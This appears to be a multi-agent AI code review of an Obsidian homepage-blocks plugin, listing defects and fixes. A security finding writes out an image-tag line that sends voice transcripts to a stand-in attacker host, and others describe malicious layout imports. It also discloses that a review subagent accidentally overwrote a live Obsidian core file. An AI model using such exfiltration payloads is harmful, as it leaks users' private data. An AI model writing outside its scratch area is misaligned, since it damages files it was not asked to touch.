# Code review: Homepage Blocks (xray-remediation working tree)

Branch `xray-remediation`, uncommitted working tree on top of `8dff07e` (release 1.3.0). This report synthesises a multi-agent review: 145 findings were raised, 144 confirmed (R1-R144) and 1 rejected. Findings that share a root cause and one fix are merged, which leaves 127 defects (M1-M127).

**Status (2026-09-27, not yet committed):** fixed, each with a test that failed first: **M1** (`BaseBlock.openLinksOnClick`), **M2** and **M20** (`openHomepage` picks the homepage leaf before closing the others, and "Close all tabs" also closes them when the homepage is already open), **M3** (`overflow: visible` on both axes in edit mode; checked in headless Chromium, since the unit tests cannot compute scrolling). 2026-09-28: **M4** (an open Static Text draft is saved when the block is unloaded, unless the stored text was replaced meanwhile; the Discard snapshot is taken after entering edit mode, which also fixes risk E in `docs/api/grid.md`). **M31** (a width of 0, a hidden tab, is ignored by the responsive columns) and **M32** (a column change runs with GridStack's animation off, so auto-height measures the final width); both checked in headless Chromium with the plugin's real `GridLayout` and `StaticTextBlock`. **M5** (a collapsed block is drawn one row high in view mode, at render and after a widen-back, through `viewModeHeight`).

| Severity | Merged defects | NEW | KNOWN | In remediation diff | Source findings |
|---|---:|---:|---:|---:|---:|
| High | 3 | 3 | 0 | 0 | 4 |
| Medium | 48 | 48 | 0 | 3 | 61 |
| Low | 76 | 75 | 1 | 9 | 79 |
| **Total** | **127** | **126** | **1** | **12** | **144** |

- **KNOWN:** only M60 is an open known issue (RF-S4, reached by a second trigger). 23 NEW defects carry a "related:" note. They sit in the same area as a known ID but have a different root cause, so fixing the known list would leave them in place.
- **Remediation:** 12 defects sit in code the remediation changed: 3 medium and 9 low. 6 of the 12 are test or docs gaps. The other 115 are in code the remediation did not touch, because the review covered the whole plugin, not only the diff.
- **Severity:** all severities are the verified ones. Verification lowered 19 finder severities and raised none.

> **Incident during the review (not a plugin defect; resolved).** At 16:21 on 2026-09-27 a review subagent's scratch script overwrote the Obsidian core file `%APPDATA%\obsidian\obsidian-1.13.7.asar` with the 3.9 MB extracted `app.js`. Two agents had written a script with the same name, `asar_extract.py`, into one shared scratch directory with opposite argument order, and one ran the other's script with the live asar path as its output. With the user's approval the file was restored at 18:50 from the official release, `obsidian-1.13.7.asar.gz` on GitHub. The restored file is 25,787,463 bytes, the original size, and its `app.js` is byte-identical to the overwritten content. A scan of every agent's commands found no other write outside scratch directories. The vault, `data.json`, `main.js` and the repo were not touched; tsc, ESLint and all 231 tests pass. Host-code evidence after 16:21 came from copies extracted earlier, except the styling sweep: it read `app.css` from the installer's bundled core (dated March 2026), because the 1.13.7 file no longer contains CSS.

## How far to trust this

- **Verification barely discriminated.** 144 of 145 findings were confirmed. The one rejection was dead code with no runtime effect. 138 of the 144 were confirmed unanimously, and the other 6 at 2/3. Every dissent argues "intended design" or "test gap no user can hit"; none disputes a mechanism. Verification did move severity: 19 downgrades (8 of them from high) and no upgrades. So read "confirmed" as "the mechanism survived an adversarial trace, often a reproduction", not as a calibrated impact. Verifiers also narrowed several scenarios:
  - M48: the desktop half was refuted.
  - M51: the Random note title is not affected.
  - M54: the premise that opening a note replaces the homepage tab is wrong.
  - M33: the block grows one row per render, not two.
  - M19: the Gemini half is overstated.
  - M78: "loads twice on every open" is wrong.
  - M89: only the title half is a defect.
  - M68: the letter-case half is weak.
  - M113: the mobile screen-reader half is overstated.
- **The review did not run dry.** The base pass (8 dimensions) confirmed 60 findings and no high. Sweeps 1, 2 and 3 then added 21, 28 and 35 confirmed findings, and all four high findings came from sweeps (three in sweep 1, one in sweep 2). Yield was still rising when the review stopped at its sweep cap. What that implies:
  - 127 defects is a floor, not a count.
  - Areas no sweep targeted probably hold more defects, possibly high ones. These include the render paths of blocks outside the swept topics, the 10 block types with no test file, and most of `styles.css` outside the swept rules.
  - If no defect is listed for an area, the area was not swept. That does not make it clean.
  - Before a release, plan at least one more sweep round aimed at the unswept blocks.
- **Where the evidence comes from.** Host behaviour was read from the installed Obsidian 1.13.7 core. Many findings were reproduced in headless Chromium (Playwright) or in a copy of Obsidian's Electron 39 runtime, using the real plugin modules, GridStack 12.4.2 and `styles.css`. No finding was run inside a live Obsidian instance, and mobile behaviour was inferred, not tested on a device. In particular, M1 is verified on desktop only, and M48 on iOS only from host code.
- **Known-list overlap is small.** Only one defect matches a known open ID. The known list and this review are largely disjoint.

## Fix first

1. **M1**: wikilinks, tags and footnotes in Static Text and Embedded Note do nothing when clicked. This breaks the two blocks' main use (high).
2. **M2**: the 'Close all tabs' open mode closes every tab and then throws, so the homepage never opens in that mode (high). Fix it together with **M20**.
3. **M3**: in edit mode at 100% zoom, drags and resizes land offset by the grid's own scroll, and the wrong position is saved. This happens during ordinary editing (high).
4. **M4**: an open Static Text draft is silently discarded by the edit button, the 'Toggle edit mode' command, settings reloads and closing the tab. The edit button uses the same pencil icon as the draft editor.
5. **M31 + M32**: every tab switch collapses the grid to one column and back. Iframes reload, Static Text is measured mid-transition, and a wrong layout is written to `data.json`.
6. **M5**: after every reload, a collapsed block reopens as a full-height empty card.
7. **M33**: a Random note block grows by one row per measurement and saves the pushed-down layout.
8. **M25**: in Separate mode on a phone, with the default single mobile column, every drag is saved as "move to top".
9. **M11, M12, M13**: imported layouts are trusted. An import can put a live page over the homepage or run DataviewJS through Static Text, leak every voice transcript through the note template, or store a number that hangs Obsidian on every open.
10. **M15**: Gemini transcription fails for every user on the default model, and each recording is discarded.
11. **M16**: double-tapping the mic leaves the microphone recording until Obsidian restarts (privacy).
12. **M40**: an Embedded Note in its default Scroll mode cannot scroll.

## Defects by severity

In each entry, "remediation" says whether the defect sits in code the remediation changed. "votes" counts the verifiers (out of 3) who judged the finding real.

### High

#### M1. Wikilinks, tags and footnotes in Static Text and Embedded Note do nothing when clicked
high · NEW · remediation: no · votes 3/3 · R1, R2 · `src/blocks/StaticTextBlock.ts:56`, `src/blocks/EmbeddedNoteBlock.ts:95`
- **Failure:** both blocks render with the static `MarkdownRenderer.render` into a bare div and attach no link handling. In Obsidian 1.13.7, only reading view, embeds and the editor wire `a.internal-link` and `a.tag`. So on desktop a click on `[[Note]]`, `[text](Note.md)`, `#tag` or a footnote becomes a denied window-open and nothing happens. This holds for plain, Ctrl and middle clicks, and there is no hover preview, although the links still look clickable. Mobile is unverified.
- **Fix:** in BaseBlock, register a delegated `click`/`auxclick` handler after rendering:
  - `a.internal-link` → `openLinkText(data-href, sourcePath, Keymap.isModEvent(evt))`
  - `a.tag` → open tag search
  - Optionally trigger `hover-link` on mouseover.

#### M2. 'Close all tabs' closes every tab, then throws before opening the homepage
high · NEW · remediation: no · votes 3/3 · R3 · `src/main.ts:528` (replace-all branch, 522-528)
- **Failure:** with no homepage tab open, `openHomepage('replace-all')` detaches every root-split leaf, then calls `getLeaf(true)`. The host refills an empty root split only in a queued microtask, so `getLeaf(true)` throws "No tab group found.", and `void` swallows the error. Every tab closes and the user is left on an empty tab. This happens from the ribbon, from the command, and at startup whenever no homepage tab was restored. Verifiers replayed it against the real 1.13.7 workspace classes.
- **Fix:** create the homepage leaf and set its view state before detaching the other leaves (or reuse one root leaf). Add a test whose workspace mock throws on an empty root split.

#### M3. At 100% zoom the edit-mode grid scrolls itself, so drags and resizes land offset and are saved there
high · NEW · remediation: no · votes 3/3 · R4 · `styles.css:2270` (edit rule 2263-2275; base 44-48)
- **Failure:** the edit rule sets only `overflow-y: visible`, while `overflow-x` stays `hidden`. CSS then computes `overflow-y` as `auto`, so the grid becomes its own scroller. GridStack ignores the grid's `scrollTop`: once the grid is scrolled, a widened block jumps rows up and a drop lands above the pointer, and that position is saved. The editor runs at 100% after any Move, Duplicate, settings Save, Add or column change (M71 resets the zoom). Reproduced in Chromium.
- **Fix:** set `overflow: visible` on both axes for `.homepage-view.hp-toolbar-open .homepage-grid.grid-stack`, so the view is the only scroller.

### Medium

#### Persistence and data loss

#### M4. An open Static Text draft is discarded by the edit toggle, settings reloads and tab close
medium · NEW · remediation: no · votes 3/3 · R7, R74 · `src/GridLayout.ts:218`, `src/HomepageView.ts:25`, `src/blocks/StaticTextBlock.ts:77`
- **Failure:** the draft lives only in the textarea. Several paths tear the grid down without checking `hasUnsavedInlineState`, and the typed text is lost with no prompt:
  - `setEditMode`: the edit button (same pencil icon as the draft editor) and 'Toggle edit mode' from any pane
  - `reloadOpenHomepages`: Compact layout, Copy to mobile, Reset, Import
  - closing the tab

  The fixed RF-R3 guard protects only `rerender()`.
- **Fix:** commit the draft on unload: in `StaticTextBlock.onunload`, call `updateBlockConfig` when the textarea differs from `liveConfig()`. Alternatively, have `toggleEditMode` await a commit hook, or refuse while any block reports unsaved state.

#### M5. Collapsing a block never saves a 1-row height, so it reopens as a full-height empty card
medium · NEW, related RF-R17 · remediation: no · votes 3/3 · R38, R39 · `src/grid/CollapseToggle.ts:53-55`, `src/GridLayout.ts:347-352`
- **Failure:** collapse shrinks the live GridStack node to `h: 1` but saves only `collapsed: true` and `_expandedH`, so `h` keeps its expanded value. Every reload then renders the block at full height with a hidden body. Auto-height blocks are never corrected, because AutoHeight skips collapsed blocks and LayoutPersister never writes `h` for them.
- **Fix:** save `h: 1` together with `collapsed: true`, or render any effectively collapsed block at `h: 1` whatever `h` is stored.

#### M6. Changing Responsive mode mid-edit makes Discard overwrite the other platform's layout
medium · NEW, related RF-R14 · remediation: no · votes 3/3 · R5 · `src/EditToolbar.ts:45`, `src/EditToolbar.ts:76`, `src/GridLayout.ts:590`, `src/settings/HomepageSettingTab.ts:219`
- **Failure:** on a phone in edit mode, the user switches Responsive mode in Settings. That setting saves without reloading open views. The edit snapshot does not record which array it came from, so on exit:
  - Discard writes the snapshot into the other array. For example, the mobile blocks replace the whole desktop layout, and that syncs.
  - Done repacks the other array to the phone's column count.
- **Fix:** record the target array and column count with the snapshot and write back to it. Alternatively, reload open views after a `responsiveMode` change (see M76).

#### M7. Reset layout and Copy to mobile overwrite a whole layout on one click; in Separate mode, Reset sits under 'Mobile layout' but resets the desktop layout
medium · NEW, related RF-R12, KEY-SLOT · remediation: no · R46, R47 · `src/settings/HomepageSettingTab.ts:341-358`, `src/settings/HomepageSettingTab.ts:263-283`
- **Failure:** both actions replace the layout, block content included, with no confirmation and no backup, and the change syncs. The display section has no heading of its own, so in Separate mode the Reset row renders under 'Mobile layout' yet resets the desktop layout (and `responsiveMode`). A Unified-mode reset also drops the voice block's API key for every device.
- **Fix:** add a confirmation modal that names the layout being replaced, write a sibling backup before saving, and give the display section its own heading.
- **Votes:** R46 3/3. R47 2/3; the dissent calls it a warned, documented destructive action by design.

#### M8. Blocks past the 100th are deleted silently at the next load
medium · NEW · remediation: no · votes 3/3 · R55 · `src/validation.ts:260` (`MAX_BLOCKS` :120), `src/GridLayout.ts:280-288`, `src/grid/EditHandleBar.ts:151-161`
- **Failure:** Add block and Duplicate never enforce the 100-block cap, and the session saves every block. At the next load, `validateBlocks` truncates each array to 100 with no Notice and no `.invalid` backup, and `onload` re-saves the truncated layout to every synced device.
- **Fix:** enforce the cap when blocks are created, and report a load-time truncation the same way as dropped blocks (backup plus Notice).

#### M9. Copy to mobile saves overlapping positions
medium · NEW · remediation: no · votes 3/3 · R45 · `src/settings/HomepageSettingTab.ts:266-280`, `src/grid/EditHandleBar.ts:228-237`
- **Failure:** the copy clamps `x` and `w` but keeps the desktop `y`. With one mobile column, all blocks from one desktop row share `(0, y)`. The phone orders them by array insertion order, and Move up/down cannot swap blocks that share a saved position. The impact verifier rated it low: the problem is ordering and it self-heals.
- **Fix:** sort the copy by `(y, x)` and run `packRows` in reflow mode before saving.

#### M10. Clear accent saves a grey accent, and Clear gradient saves the default purple gradient
medium · NEW · remediation: no · votes 3/3 · R44 · `src/modals/BlockSettingsModal.ts:305-309`, `src/modals/BlockSettingsModal.ts:280-286`
- **Failure:** in Obsidian, `ColorComponent.setValue` fires `onChange`. Both clear handlers reset the draft first and only then call `setValue(seed)`, so the seed colour is written back and marked dirty. Saving then stores `#888888`, or `#667eea → #764ba2`. The mock ColorComponent never fires `onChange`, so no test sees this.
- **Fix:** call `setValue` first and reset the draft and dirty flag afterwards. Make the mock fire `onChange` the way the host does, and add a test.

#### Security and import trust

#### M11. Clipboard import renders static-text Markdown verbatim: live third-party pages over the homepage, and DataviewJS execution
medium (finder: high) · NEW · remediation: yes · votes 3/3 · R51 · `src/utils/importSanitizer.ts:111`, `src/blocks/StaticTextBlock.ts:56`, `src/settings/HomepageSettingTab.ts:417-431`
- **Failure:** static-text `content` is a declared string key, so any imported Markdown survives import and `MarkdownRenderer` renders it. The host sanitizer keeps iframes (sandboxed with `allow-scripts`) and `style` attributes. An imported layout can therefore:
  - load a live page, such as a fake sign-in, over the whole homepage on every open
  - fire `obsidian://` actions from its links
  - run code with Node access through a `dataviewjs` block, if DataviewJS is enabled

  The confirmation dialog shows only the block count and types.
- **Fix:** treat imported markup-bearing fields (static-text `content`, html `html`, voice `noteTemplate`) as untrusted: strip or neutralise them, or show them with a warning in the confirmation.

#### M12. An imported voice `noteTemplate` can leak every transcript through a remote image
medium · NEW · remediation: no · votes 3/3 · R33 · `src/blocks/VoiceDictationBlock.ts:269-272`, `src/utils/importSanitizer.ts:111`, `src/main.ts:195`
- **Failure:** the template survives import verbatim, and `saveNote` substitutes `{{transcript}}` raw into every new voice note. A template that hides `<img src="https://attacker/?d={{transcript}}">` below blank lines (out of view in the 4-row field) sends each dictation to the attacker when the note is opened.
- **Fix:** do not import `noteTemplate` and `folder`, or show them in the confirmation. Allow `{{transcript}}` only as standalone text, or insert the transcript escaped.

#### M13. Imported numeric block settings are never range-checked; one value can hang Obsidian on every open
medium · NEW, related IMPORT-ELEMENTS · remediation: yes · votes 3/3 · R50 · `src/utils/importSanitizer.ts:25`, `src/blocks/PomodoroBlock.ts:364-371`, `src/blocks/RecentFilesBlock.ts:44,56`
- **Failure:** declared numeric keys are type-checked only, at import and at load. Imported values:

  | Value | Effect |
  |---|---|
  | `sessionsBeforeLong: 1e9` | creates a billion spans; hangs Obsidian on every homepage open, because the layout is already saved |
  | `sessionsBeforeLong: 0` | never takes a long break |
  | zero minutes with auto-start | chimes every second |
  | Recent files `maxItems: -1` | lists the whole vault |

  The settings sliders display a clamped value, but Save keeps the stored one.
- **Fix:** keep a per-type range table built from the slider bounds, clamp in `sanitizeImportedConfig`, and clamp again at the read sites.

#### M14. No test pins the branches that keep plaintext API keys off disk
medium · NEW · remediation: yes · votes 3/3 · R48 · `src/utils/apiKeyLayout.ts:21`, `src/utils/apiKeyLayout.ts:66-85`
- **Failure:** refuse-to-downgrade, the transient-failure drop and `mobileBlocks` encryption are untested. Mutants that write a plaintext key to the vault-synced `data.json` pass all 231 tests. Such a mutant fires on a single WebCrypto or IndexedDB hiccup, or on every save of a Separate-mode mobile voice block.
- **Fix:** add tests that make `crypto.subtle.encrypt` reject, with and without a prior ciphertext, and a `persistableLayout` test with a plaintext key only in `mobileBlocks`.

#### Voice dictation

#### M15. Every offered transcription model is retired (Gemini) or scheduled for removal (OpenAI), and no other model can be entered
medium (finder: high) · NEW · remediation: no · votes 3/3 · R29, R30 · `src/blocks/VoiceDictationBlock.ts:44-55`, `:434`, `:484`, `:567`, `:590-603`
- **Failure:** the Model setting is a fixed dropdown of hard-coded models.
  - Gemini: the default `gemini-2.0-flash` (and `-lite`) shut down on 2026-06-01, and 2.5 is limited to earlier users. Every Gemini recording ends in "Transcription failed" and is discarded, and a new key can use none of the four options.
  - OpenAI: all three offered models are removed on 2027-02-26, and `gpt-transcribe` cannot be selected.
- **Fix:**
  - Switch to current defaults, such as `gemini-3.8-flash`/`3.5-flash-lite` and `gpt-transcribe`.
  - Add a validated free-text custom model.
  - Migrate stored retired values.
  - Show a distinct Notice for 403/404.

#### M16. Double-tapping the mic starts two recorders; the orphan keeps the microphone open until restart
medium · NEW, related RF-S5, RF-R10 · remediation: no · votes 3/3 · R34, R35 · `src/blocks/VoiceDictationBlock.ts:152-158`, `:277-299`, `:330-348`, `:210-219`
- **Failure:** the state becomes 'recording' only after `await getUserMedia`, so a second tap during the wait starts a second recorder. The first stream, recorder and elapsed-time interval are orphaned. The OS mic indicator stays on (on Android, other apps lose the mic), and stop, closing the homepage or disabling the plugin do not release it. An unload during the consent modal or `getUserMedia` leaks the same way.
- **Fix:**
  - Set a 'starting' state or generation token synchronously on entry.
  - After the await, stop the new tracks if the call was superseded or the block unloaded.
  - Stop any existing recorder and stream before overwriting them.
  - Clear the previous interval.

#### M17. A destination folder containing '..' shows "Saved" but writes nothing
medium · NEW, related RF-R10 · remediation: no · votes 3/3 · R31 · `src/blocks/VoiceDictationBlock.ts:253`, `:411-412`
- **Failure:** the `..` guard in `saveNote` is a bare `return`, so `handleCloudStop` shows the success flash after a paid transcription while the transcript is lost.
- **Fix:** throw, so the existing "Failed to save note" path runs. Validate the folder in settings and keep the transcript.

#### M18. A destination folder that differs from the real one only in letter case makes every save fail
medium · NEW, related RF-R10 · remediation: no · votes 3/3 · R32 · `src/blocks/VoiceDictationBlock.ts:259-266`
- **Failure:** `saveNote` looks each folder up with the exact-case `getAbstractFileByPath` and calls `createFolder` on a miss. On case-insensitive filesystems (Windows, macOS, iOS) `createFolder` throws "Folder already exists". Every dictation after a case-only rename, or a mistyped case, is transcribed and billed, then discarded.
- **Fix:** resolve each segment case-insensitively and treat "already exists" as success. Keep the transcript on failure.

#### M19. Recordings over the provider limit always fail, and the whole recording is lost
medium · NEW, related RF-R10 · remediation: no · votes 3/3 · R36 · `src/blocks/VoiceDictationBlock.ts:347`, `:372`, `:445-458`, `:474-509`
- **Failure:** recording length is unbounded and the blob size is never checked. Past OpenAI's 25 MB file limit (about 26-52 minutes) the request fails and the recording is dropped, and it fails again at the same length. The refute vote calls the Gemini half (20 MB inline limit, base64-inflated) overstated.
- **Fix:** check the blob size against the provider cap before sending. Split the audio or use Gemini's Files API. Save the audio on any failure.

#### Opening the homepage and notes

#### M20. An existing homepage tab bypasses the open mode, so 'Close all tabs' closes nothing
medium · NEW · remediation: no · votes 3/3 · R43 · `src/main.ts:514-518`
- **Failure:** `openHomepage` returns early whenever any homepage leaf exists, so `mode` is never read:
  - at startup, a restored homepage tab is just revealed and every other restored tab stays open
  - the ribbon and the command close nothing while a homepage tab exists

  Together with M2, the mode never gives its documented result.
- **Fix:** apply replace-all even when a homepage leaf exists: detach the other root leaves, then reveal and activate the homepage. Document the reveal behaviour for the other modes.

#### M21. Blocks open a file they already hold through the link resolver; a '#' in the path creates or opens a different note
medium · NEW · remediation: no · votes 3/3 · R23 · `src/blocks/RecentFilesBlock.ts:78-80`, `src/blocks/VaultSearchBlock.ts:166,198`, `src/blocks/FolderLinksBlock.ts:144`, `src/blocks/RandomNoteBlock.ts:165,178`
- **Failure:** Recent files, Vault search, Folder links and Random note hold a TFile but open it with `openLinkText(file.path, '')`, which parses the path as link text. A `#` in a file or folder name, or an extensionless or non-Markdown file, either opens a different note or creates a new empty one on every click (`Issue.md`, `Issue 1.md`, … or `Untitled N`), and the stray notes sync.
- **Fix:** open the TFile through one shared helper, `getLeaf(Keymap.isModEvent(evt)).openFile(file)`, which also fixes M65. Keep `openLinkText` for user-typed link text only.

#### M22. Typed note links do not follow a rename; the next click creates an empty note at the old path
medium · NEW · remediation: no · votes 3/3 · R12 · `src/blocks/ButtonGridBlock.ts:46-54`, `src/blocks/FolderLinksBlock.ts:172`, `src/blocks/BookmarkBlock.ts:64`
- **Failure:** links typed into Button grid, Quick links (manual) and Bookmarks are never updated on rename, move or delete. The next click goes through `openLinkText`, which creates and opens an empty note at the old path, so it looks as if the note's content was wiped.
- **Fix:** resolve with `getFirstLinkpathDest` and show a Notice on a miss. Follow renames with a vault 'rename' handler that rewrites the stored links in both block arrays.

#### M23. Bookmarks sends every non-http(s) value to openLinkText
medium · NEW · remediation: no · votes 3/3 · R11 · `src/blocks/BookmarkBlock.ts:49-64`
- **Failure:** a schemeless `github.com` creates a stray folder and note. `obsidian://`, `mailto:` and `zotero://` bookmarks never open and show a file-name error instead.
- **Fix:**
  - Open any non-dangerous absolute URL externally.
  - Treat domain-like values as `https://`.
  - Send only resolvable vault paths to the note path, with a Notice otherwise.

#### M24. On touch devices, Vault Search opens a result on touchstart, so the result list cannot scroll
medium · NEW · remediation: no · votes 3/3 · R26 · `src/blocks/VaultSearchBlock.ts:164-171`
- **Failure:** `touchstart` calls `preventDefault` and opens the note at once. Any swipe that starts on a result opens it, and results past about the sixth are unreachable in the 320 px list.
- **Fix:** open on `click`, or on a `touchend` without movement. Prevent input blur with a `pointerdown` handler that does not navigate.

#### Edit mode

#### M25. Single-column edit mode saves every drag as "move to top"
medium (finder: high) · NEW · remediation: no · votes 3/3 · R61 · `styles.css:2972-2988`, `src/GridLayout.ts:375`, `src/grid/ResponsiveColumns.ts:79-82`
- **Failure:** in Separate mode with the default single mobile column, edit mode keeps `hp-single-column`. Its `top/left: auto !important` pins the dragged item at the start of the list, so every drag computes `y = 0` and saves it. The placeholder is a 0 px last child, and nothing visibly changes until Done. Only the chevron buttons reorder correctly.
- **Fix:** toggle `hp-single-column` only outside edit mode, or scope those rules with `:not(.edit-mode)`. Add a render test.

#### M26. With the fit zoom applied, scrolling during a drag pulls the block off the pointer
medium · NEW · remediation: no · votes 3/3 · R8 · `src/GridLayout.ts:264-266`, `styles.css:3787-3791`
- **Failure:** the fit zoom is a CSS transform, which makes the grid the containing block for GridStack's `position: fixed` drag helper. Edge auto-scroll or the mouse wheel during a drag moves the card away from the cursor, and the drop lands rows above it.
- **Fix:** scale without a transform (CSS `zoom`, to be verified with GridStack), refresh the drag offsets on scroll, or disable `draggable.scroll` while zoomed. Correct the comment at `GridLayout.ts:413-414`.

#### M27. Every edit-mode re-render scrolls the editor back to the top
medium · NEW · remediation: no · votes 3/3 · R9 · `src/GridLayout.ts:292-301`, `src/GridLayout.ts:304-331`
- **Failure:** Move up/down, settings Save and a column change rebuild the grid, which resets the scroll position, so the moved block ends up off-screen. On phones the chevrons are the only working way to reorder (M25), so each tap costs a scroll back to the block.
- **Fix:** save the view's and grid's `scrollTop` before teardown and restore it after init (after the zoom is applied), or scroll the moved block into view.

#### M28. On phones and tablets in edit mode, the block handle bar is clipped (Settings, Duplicate and Remove hidden)
medium · NEW · remediation: no · votes 3/3 · R60 · `styles.css:2581-2588`, `:3065-3071`, `:122-130`, `:3183-3198`
- **Failure:** edit mode keeps the canonical column count on narrow panes. The handle bar is a no-wrap row of six 44 px controls inside a card with `overflow: hidden`. On a phone a width-1 block shows only its grip and part of Move up, and on a 768 px tablet Remove is cut off. The column picker is hidden at 380 px and below, and it offers no 1-column option in Unified mode. The RF-R2 fix (canonical columns in edit mode) entrenches this.
- **Fix:** let the bar wrap or move the secondary actions into an overflow menu. Keep the column picker visible, and allow 1 column when editing on a narrow pane.

#### M29. Drag and resize do nothing when the homepage is in a popout window
medium · NEW, related RF-R18 · remediation: no · votes 3/3 · R10 · `src/GridLayout.ts:377-389`
- **Failure:** GridStack binds its move and up listeners to the main window's `document`. In a popout, drags never start, and the `mouseHandled` flag then stays stuck, which blocks drags on the main-window homepage until the user clicks somewhere in the main window. Only Move up/down work.
- **Fix:** when `gridEl.doc !== document`, disable drag and resize and show a hint, or forward the popout's pointer events to GridStack.

#### M30. The hidden edit toolbar stays in the Tab order and can change the saved column count
medium · NEW · remediation: no · votes 3/3 · R6 · `src/EditToolbar.ts:34-37`, `:102-150`, `styles.css:2233-2251`
- **Failure:** in view mode the toolbar is hidden only with `max-height: 0; opacity: 0`. Its select, slider and buttons stay focusable. Arrow keys on the invisible column select change and save the column count, and the invisible Done button enters edit mode.
- **Fix:** toggle `inert` (or `display: none` after the transition) together with `is-visible`, and make `setColumns` a no-op outside edit mode.

#### Auto-height, responsive columns, hidden tabs

#### M31. A hidden homepage tab is treated as a 0 px pane: every tab switch collapses the grid to one column and back
medium (finder: high) · NEW · remediation: no · votes 3/3 · R40 · `src/grid/ResponsiveColumns.ts:66`, `:83-86`, `:38-39`, `:173-177`
- **Failure:** Obsidian hides background tabs with `display: none`, and the view-mode ResizeObserver reads width 0 as a narrow pane. It applies 1 column, then the canonical count on return. On every switch:
  - every item is re-appended, so iframes reload and a playing video stops
  - the scroll position jumps
  - cards animate in from full width

  It also triggers M32 and M37.
- **Fix:** ignore zero-size observations, and keep the current columns in `setup()` when `clientWidth` is 0, as GridStack itself does.

#### M32. After a column change back to canonical, auto-height is measured mid-transition and a wrong layout is saved
medium (finder: high) · NEW · remediation: no · votes 3/3 · R42 · `src/grid/ResponsiveColumns.ts:117`, `:142-150`, `src/grid/AutoHeight.ts:56,126,131`, `src/GridLayout.ts:382`
- **Failure:** the measurement runs one frame after the column change, while GridStack's 0.3 s width transition is still running. Static Text is measured at the wrong width, shrinks and is clipped, the blocks below move up, and that layout is persisted. It happens on every tab switch (through M31) and on real resizes across a breakpoint.
- **Fix:** measure after the geometry settles: disable animation around `apply()`, or defer the requests until `transitionend`. A width observer on Static Text and Embedded Note would also let them correct themselves.

#### M33. Random note grows by one row on every measurement
medium · NEW · remediation: no · R21, R22 · `src/blocks/RandomNoteBlock.ts:121-123`, `styles.css:380-383`, `:1417-1422`, `src/grid/AutoHeight.ts:131-164`
- **Failure:** the block marks its own flex-sized, size-contained `.block-content` as the auto-height element. Each measurement returns the cell height plus padding, which is one row more. The block grows on open, on every edit to a tagged note, and on resizes (about a row per frame while dragging a window edge). It pushes the blocks below it down, and the grown height and pushed positions are saved.
- **Fix:** mark and observe an inner, content-sized wrapper, and do not use `container-type: size` on a measured element. Alternatively, drop `autoHeight` for `random-note`.
- **Votes:** 3/3 on both findings. The R22 trace vote corrects the growth to one row per render, not two.

#### M34. Static Text and grow-mode Embedded Note are measured once and never again
medium · NEW · remediation: no · votes 3/3 · R14, R24, R25 · `src/blocks/StaticTextBlock.ts:13-21`, `:44-47`, `src/blocks/EmbeddedNoteBlock.ts:88-90`, `src/GridLayout.ts:529-546`
- **Failure:** the card keeps its mount-time height through three kinds of later change:
  - late content: Static Text's `render()` drops its promise, so images loaded later never count
  - width changes that keep the column count: sidebar toggles, window resizes
  - content changes: an opened folded callout, a Dataview refresh

  Static Text then shows an inner scrollbar, and grow-mode Embedded Note cuts its content off with no scrollbar.
- **Fix:** wrap the rendered Markdown in a content-sized element and observe it with a rAF-throttled ResizeObserver registered for cleanup; call `requestAutoHeight()` whenever its size changes.

#### M35. On a narrowed pane, the responsive column change drops queued auto-height measurements for good
medium · NEW · remediation: no · votes 3/3 · R41 · `src/grid/ResponsiveColumns.ts:107-109`, `:154-179`, `src/GridLayout.ts:436-437`, `:542-546`
- **Failure:** on a pane below the canonical breakpoint (for example 3 columns at 480-767 px), `setup()` → `apply()` cancels the measurements queued at mount, and `packForNarrowLayout` never queues them again. Static Text stays at its stored height, and grow-mode Embedded Note keeps its wider-width height.
- **Fix:** after a narrow `apply()`, re-request auto-height for every auto-height block, as `restoreCanonicalLayout` does.

#### M36. A daily text quote in 'Grow to fit all' mode never grows
medium · NEW · remediation: no · votes 3/3 · R18 · `src/blocks/QuotesListBlock.ts:134-138`, `:303-306`, `src/GridLayout.ts:123`
- **Failure:** with source 'Manual text', Max quotes 1 and the default height mode, the single-text path sets no auto-height marker. The block stays at 3 rows, long quotes are clipped with no scrollbar, and edit mode hides its resize handle because it counts as an auto-height block.
- **Fix:** apply the extend-mode class and `AUTO_HEIGHT_ATTR` on the single text card too.

#### M37. An HTML block in document mode never scales to its card if its iframe loads while the tab is hidden
medium · NEW · remediation: no · votes 3/3 · R16 · `src/blocks/HtmlBlock.ts:114-120`
- **Failure:** the fit-to-card scale runs only in the iframe's load handler and gives up when `clientHeight` is 0. After a load while hidden (every tab switch through M31, or a settings reload of a background homepage), the document shows at 100% scale, clipped, with an inner scrollbar.
- **Fix:** run the scale from the load handler and from a ResizeObserver, skipping while the frame has no size.

#### M38. In single column, HTML blocks are squeezed into a 150 px iframe and scaled until unreadable; videos are fixed at 150 px
medium · NEW · remediation: no · votes 3/3 · R15 · `src/blocks/HtmlBlock.ts:114-133`, `styles.css:2126-2165`, `:3005`
- **Failure:** single-column mode (every phone in portrait) sets `height: auto` on the blocks' containers, so the iframes' `height: 100%` resolves to `auto` and they fall back to 150 px. The HTML block then scales its whole document into that strip (16 px text renders at about 6 px, and the end is clipped), and video embeds are letterboxed at 150 px.
- **Fix:** in single column, size the iframe to its content and skip the scale. For video, use `height: auto; aspect-ratio: 16/9`.

#### M39. In single column, Random note, Clock and Greeting shrink to the 60 px floor
medium · NEW · remediation: no · votes 3/3 · R57 · `styles.css:1417-1422`, `:832`, `:643`, `:3005-3008`
- **Failure:** these three blocks set `container-type: size` on `.block-content`. In single column that element's height is `auto` with a 60 px minimum, and size containment resolves it to exactly 60 px:
  - Random note: the cover and preview are always hidden and the footer is cut off
  - Clock: the time shrinks to 22 px
  - Greeting: the emoji shrinks to 32 px
- **Fix:** extend the existing single-column `container-type: inline-size` override (already used for Pomodoro and Voice) to these three blocks.

#### Block content and rendering

#### M40. An Embedded Note in its default Scroll mode cannot scroll
medium (finder: high) · NEW · remediation: no · votes 3/3 · R59 · `styles.css:1999-2003` vs `styles.css:2484-2487`
- **Failure:** `.embedded-note-content { overflow-y: auto }` loses to the generic `.homepage-block-wrapper .block-content > * { overflow: hidden }`. A note longer than the card cannot be scrolled by wheel or keyboard, although the region is focusable. In single column it stops at 400 px.
- **Fix:** add a higher-specificity override, as Static Text has at `styles.css:2065`.

#### M41. Gallery Height 'Fixed (scroll)' never scrolls
medium · NEW · remediation: no · votes 3/3 · R58 · `styles.css:1775-1778`, `:1740-1750`, `:1787-1790`, `:2484-2487`
- **Failure:** the same generic `overflow: hidden` wins, and the auto grid rows share the fixed height. Forty images render as 5 px strips (blank from about 150 images), and masonry shows only its first row, with the rest in clipped columns.
